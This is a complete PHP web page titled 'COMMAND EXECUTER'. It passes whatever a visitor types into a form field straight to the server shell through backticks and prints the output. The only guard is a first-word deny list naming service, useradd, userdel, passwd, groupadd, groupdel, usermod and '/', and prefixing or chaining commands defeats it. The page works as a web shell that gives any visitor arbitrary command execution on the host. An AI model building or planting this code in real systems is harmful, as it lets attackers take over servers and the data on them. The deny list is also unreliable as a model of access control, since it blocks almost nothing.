<html>
	<head><title>COMMAND EXECUTER</title></head>
        <body>
<center>		<a href="/index.php">Home</a>
			<form action="" method="POST">
			Enter command : <input type="text" name="cmd">
			<input type="submit" name="sub" value="Execute">
		</form> 
</center>		
			<?php
				if(isset($_POST['sub'])){
					if(empty($_POST['cmd']))
						echo "Fill the field!!"; 	
					else{
						$cmd=$_POST['cmd'];
						$x=explode(" ",$cmd);
						if($x[0]=="service" || $x[0]=="useradd" || $x[0]=="userdel" || $x[0]=="passwd" || $x[0]=="groupadd" || $x[0]=="groupdel" || $x[0]=="usermod" || $x[0]=="/"){
							echo "Permission denied!!";
							}
						else
							{
							$out=`$cmd`;
							echo "<center><pre>$out</pre></center>";
							}
					}
				}
		?>
	</body>
</html>
